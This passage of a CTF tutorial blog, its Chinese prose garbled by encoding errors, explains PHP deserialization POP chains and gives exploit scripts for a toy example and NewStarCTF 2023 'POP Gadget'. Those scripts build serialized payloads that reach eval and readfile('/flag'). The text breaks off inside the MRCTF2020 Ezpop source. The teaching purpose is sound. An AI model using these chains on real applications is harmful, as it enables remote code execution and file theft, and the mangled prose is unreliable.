çš„è§£é‡Šæœ‰äº›è®¸ä¸åŒï¼Œåœ¨æŸ¥æ‰¾èµ„æ–™æ—¶äº§ç”Ÿäº†å¾ˆå¤šç–‘æƒ‘ï¼Œæ¯”å¦‚æˆ‘ç¿»é˜…çš„å…¶ä¸­ä¸€ç¯‡åšå®¢ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/10/4YHGV9zljdy67vL.png" alt="5fd161f2f08ca123a0c6ccd8f4cc17cd.png"></p><p>åŸæ–‡è¯´æ­¤å¤„è§¦å‘äº† <code>__toString</code>  å‡½æ•°ï¼Œå¯æ˜æ˜åªæ˜¯å°†å±æ€§å½“ä½œå­—ç¬¦ä¸²ï¼Œ</p><p>å†æ¯”å¦‚åŒä¸€ç¯‡æ–‡ç« çš„å¦ä¸€å¤„ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/10/Ktx4MPXFmGnZ7cS.png" alt="28258fc1d508554e89f8f7d99d3855b1.png"></p><p>è§¦å‘äº† <code>__invoke</code>  å‡½æ•°</p><p>åœ¨ä¸å°ä¼™ä¼´è®¨è®ºä¹‹åï¼Œè®¤ä¸ºå¯ä»¥å°†å±æ€§çœ‹ä½œå¯¹è±¡</p><p>åœ¨å¼„æ¸…æ¥šå„ç§é­”æ³•å‡½æ•°è§¦å‘æ¡ä»¶ä¹‹åå°±è¦å¼€å§‹æ„å»º pop é“¾äº†</p><h4 id="popé“¾"><a class="markdownIt-Anchor" href="#popé“¾">#</a> POP é“¾</h4><p>POP é“¾æ„é€ é¦–å…ˆå°±æ˜¯è¦æ‰¾åˆ°å¤´å’Œå°¾ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·èƒ½ä¼ å…¥å‚æ•°çš„åœ°æ–¹ï¼ˆå¤´ï¼‰å’Œæœ€ç»ˆè¦æ‰§è¡Œå‡½æ•°æ–¹æ³•çš„åœ°æ–¹ï¼ˆå°¾ï¼‰ã€‚æ‰¾åˆ°å¤´å°¾ä¹‹åè¿›è¡Œåæ¨è¿‡ç¨‹ï¼Œä»å°¾éƒ¨å¼€å§‹ä¸€æ­¥æ­¥æ‰¾åˆ°èƒ½è§¦å‘ä¸Šä¸€æ­¥çš„åœ°æ–¹ï¼Œç›´åˆ°æ‰¾åˆ°ä¼ å‚å¤„ï¼Œæ­¤æ—¶å®Œæ•´çš„ POP é“¾å°±æ˜¾è€Œæ˜“è§äº†ã€‚CTF èµ›ä¸­ä¸€èˆ¬å°¾éƒ¨å°±æ˜¯ get flag çš„æ–¹æ³•ï¼Œå¤´éƒ¨åˆ™æ˜¯ GET/POST ä¼ å‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) // 1. <span class="title">destruct</span>å‡½æ•°ä¸º<span class="title">pop</span>é“¾å¤´</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source=<span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source; <span class="comment">//è¾“å‡ºå˜é‡ï¼ŒæŠŠç±»å½“ä½œå­—ç¬¦ä¸²ï¼Œè§¦å‘__toString</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) // 2</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source; <span class="comment">//è®¿é—®ä¸å­˜åœ¨çš„å±æ€§ï¼Œè§¦å‘_get</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uwant</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123; <span class="comment">// 3 </span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getshell</span>(<span class="variable">$this</span>-&gt;params); <span class="comment">//ç›´æ¥è°ƒç”¨getshell</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getshell</span>(<span class="params"><span class="variable">$value</span></span>)  // 4</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;params); <span class="comment">//å°¾ï¼Œè¾“å‡º</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]; <span class="comment">//GETä¼ å‚å¤´</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>å…ˆæ‰¾é“¾å­çš„å¤´å’Œå°¾ï¼Œå¤´éƒ¨æ˜æ˜¾æ˜¯ GET ä¼ å‚ï¼Œå°¾éƒ¨æ˜¯ <code>Uwant</code>  ç±»ä¸­çš„ <code>getshell</code> ï¼Œç„¶åå¾€ä¸Šå€’æ¨ï¼Œ <code>Uwant</code>  ç±»ä¸­çš„ <code>__get()</code>  ä¸­è°ƒç”¨äº† <code>getshell</code> ï¼Œ <code>Show</code>  ç±»ä¸­çš„ <code>toString</code>  è°ƒç”¨äº† <code>__get()</code> ï¼Œç„¶å <code>Hello</code>  ç±»ä¸­çš„ <code>__destruct()</code> ï¼Œè€Œæˆ‘ä»¬ GET ä¼ å‚ä¹‹åä¼šå…ˆè¿›å…¥ <code>__destruct()</code> ï¼Œè¿™æ ·å­å¤´å’Œå°¾å°±è¿ä¸Šäº†ï¼Œæ‰€ä»¥è¯´å®Œæ•´çš„é“¾å­å°±æ˜¯ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¤´ -&gt; Hello::__destruct() -&gt; Show::__toString() -&gt; Uwant::__get() -&gt; Uwant::getshell -&gt; å°¾</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uwant</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Uwant</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; str = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div><h4 id="ä¾‹é¢˜"><a class="markdownIt-Anchor" href="#ä¾‹é¢˜">#</a> ä¾‹é¢˜</h4><h5 id="newstarctf-2023-week3-pop-gadget"><a class="markdownIt-Anchor" href="#newstarctf-2023-week3-pop-gadget">#</a> newstarctf 2023 week3 | POP Gadget</h5><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>; <span class="comment">//å°†å¯¹è±¡å½“ä½œå­—ç¬¦ä¸²ï¼Œå¯ä»¥è§¦å‘__toString</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) //æŠŠå¯¹è±¡å½“ä½œå­—ç¬¦ä¸²æ—¶è§¦å‘</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(); <span class="comment">//æŠŠå¯¹è±¡å½“ä½œæ–¹æ³•ï¼ˆå‡½æ•°ï¼‰ï¼Œè§¦å‘__invoke</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>) //è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>(); <span class="comment">//è°ƒç”¨endå‡½æ•°</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) //å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>(); <span class="comment">//ä¸å­˜åœ¨getStræ–¹æ³•ï¼Œè§¦å‘__call</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>) //é”™è¯¯çš„<span class="title">end</span>å‡½æ•°</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>) // æ­£ç¡®çš„<span class="title">end</span>å‡½æ•°</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log); <span class="comment">//handle-&gt;logä¸å¯è®¿é—®ï¼Œè§¦å‘__unset</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>) //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨<span class="title">unset</span>(<span class="params"></span>)æ—¶è§¦å‘</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>); <span class="comment">//å¯ä»¥æ„é€ æ‰§è¡Œç³»ç»Ÿå‘½ä»¤,æ¯”å¦‚:system(ls /)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure></div><p>ç”±æ­¤å¯ä»¥æ„é€ å‡º POP é“¾å­</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Begin::__destruct -&gt; Then::toString -&gt; Super::__invoke -&gt; Handle::__call -&gt; CTF::end -&gt; WhiteGod::__unset</span><br></pre></td></tr></table></figure></div><p>ç”±äºé“¾å­è°ƒç”¨ä¸­æˆå‘˜å±æ€§æœ‰ private å’Œ protectedï¼Œç”¨ construct æ–¹æ³•å»è°ƒç”¨é“¾å­ï¼Œæœ€åå†ä½¿ç”¨ url ç¼–ç ç»•è¿‡</p><p>exp</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func= <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;    </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;    </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="variable">$a</span>;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span> = <span class="variable">$b</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Begin</span>(<span class="keyword">new</span> <span class="title class_">Then</span>(<span class="keyword">new</span> <span class="title class_">Super</span>(<span class="keyword">new</span> <span class="title class_">Handle</span>(<span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>(<span class="keyword">new</span> <span class="title class_">WhiteGod</span>(<span class="string">&quot;readfile&quot;</span>,<span class="string">&quot;/flag&quot;</span>))))));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div><p>ç¨å¾®æ€»ç»“ä¸€ä¸‹ï¼ŒPOP é“¾çš„å¤´ä¸€èˆ¬æ˜¯ GET/POST ä¼ å‚å¼•å‘ <code>__wakeup</code>  ,  <code>__construct</code>  ,  <code>__destruct</code></p><p>ç»“å°¾ä¸€èˆ¬æ˜¯è¾“å‡ºæ•æ„Ÿä¿¡æ¯æˆ–è€…æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ‰€åœ¨å‡½æ•°ï¼Œå³ GetFlag çš„ç‚¹</p><h5 id="mrctf2020ezpop1"><a class="markdownIt-Anchor" href="#mrctf2020ezpop1">#</a> [MRCTF2020]Ezpop1</h5><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span 